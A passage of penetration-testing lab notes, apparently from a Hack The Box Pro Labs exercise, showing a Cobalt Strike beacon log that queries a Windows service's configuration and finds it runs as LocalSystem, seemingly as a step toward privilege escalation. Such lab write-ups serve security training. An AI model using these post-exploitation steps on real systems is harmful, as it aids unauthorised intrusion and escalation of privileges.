utilized to get location that takes the service
```bash
[10/20 18:58:37] beacon> shell sc qc WCAssistantService
[10/20 18:58:37] [*] Tasked beacon to run: sc qc WCAssistantService
[10/20 18:58:37] [+] host called home, sent: 55 bytes
[10/20 18:58:37] [+] received output:
[SC] QueryServiceConfig SUCCESS



SERVICE_NAME: WCAssistantService

        TYPE               : 10  WIN32_OWN_PROCESS 

        START_TYPE         : 2   AUTO_START

        ERROR_CONTROL      : 1   NORMAL

        BINARY_PATH_NAME   : C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe

        LOAD_ORDER_GROUP   : 

        TAG                : 0

        DISPLAY_NAME       : WC Assistant

        DEPENDENCIES       : 

        SERVICE_START_NAME : LocalSystem
```
![[Penetration Testing v2/htb_pro_Labs/offshore/3. 172.16.1.36 -CORP-WSADM/screenshots/Pasted image 20231020190351.png]]